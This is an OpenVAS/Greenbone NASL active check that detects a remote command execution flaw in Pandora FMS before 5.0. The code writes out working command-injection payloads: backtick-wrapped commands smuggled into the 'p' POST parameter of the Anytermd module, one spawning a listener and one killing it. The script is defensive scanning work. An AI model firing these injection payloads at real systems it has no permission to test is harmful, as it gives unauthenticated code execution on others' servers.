# Copyright (C) 2014 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:artica:pandora_fms";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103897");
  script_version("2023-01-11T10:12:37+0000");
  script_tag(name:"last_modification", value:"2023-01-11 10:12:37 +0000 (Wed, 11 Jan 2023)");
  script_tag(name:"creation_date", value:"2014-01-30 13:13:42 +0100 (Thu, 30 Jan 2014)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Pandora FMS < 5.0 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_pandora_fms_http_detect.nasl");
  script_mandatory_keys("pandora_fms/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Pandora FMS is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Try to execute a command on the remote Host by sending some
  special crafted HTTP requests.");

  script_tag(name:"insight", value:"Pandora FMS 4.0.3 / 4.1 / 5.0 RC1 appliances are prone to
  security vulnerabilities. The Anytermd daemon used for the SSH/Telnet gateway on TCP port
  8022/8023 is vulnerable to command injection in the 'p' POST parameter, which allows any
  unauthenticated attacker to execute arbitrary commands with the rights of the 'pandora' user.");

  script_tag(name:"impact", value:"Successful exploits will allow remote attackers to execute
  arbitrary commands within the context of the 'pandora' user.");

  script_tag(name:"affected", value:"Pandora FMS version 5.0RC1 and prior.");

  script_tag(name:"solution", value:"Update to version 5.0 final.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124983/Pandora-FMS-5.0RC1-Code-Execution.html");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if( ! get_app_location( cpe:CPE, nofork:TRUE ) )
  exit( 0 );

ports = make_list( "8022", "8023" );
host = get_host_name();

foreach port ( ports )
{
  if( ! get_port_state( port ) ) continue;

  rport = ( ( rand() % 65535 ) / 1024 ) + 2048;
  soc = open_sock_tcp ( rport );

  if( soc ) {
    close (soc);
    continue;
  }

  ex = 'a=open&p=%60/usr/bin/anytermd --port ' + rport + ' --user pandora -c %25p%60';
  len = strlen( ex );

  req = 'POST /anyterm-module HTTP/1.1\r\n' +
        'Host: ' + host + ':' + port + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        ex;
  result = http_send_recv( port:port, data:req, bodyonly:FALSE );
  if( ! result || result !~ "^HTTP/1\.[01] 200" ) continue;

  soc = open_sock_tcp ( rport );
  if( ! soc ) continue;
  close ( soc );

  req = 'GET /anyterm-module HTTP/1.1' +
        'Host: ' + host + ':' + rport + '\r\n\r\n';
  result = http_send_recv( port:rport, data:req, bodyonly:FALSE );

  if( result =~ "^HTTP/1\.[01]" )
  {
    # kill our anytermd process
    ex = 'a=open&p=%60kill -9 $PPID%60';
    len = strlen( ex );

    req = 'POST /anyterm-module HTTP/1.1\r\n' +
          'Host: ' + host + ':' + rport + '\r\n' +
          'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n' +
          'Content-Length: ' + len + '\r\n' +
          '\r\n' +
          ex;

    http_send_recv( port:rport, data:req, bodyonly:FALSE );
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
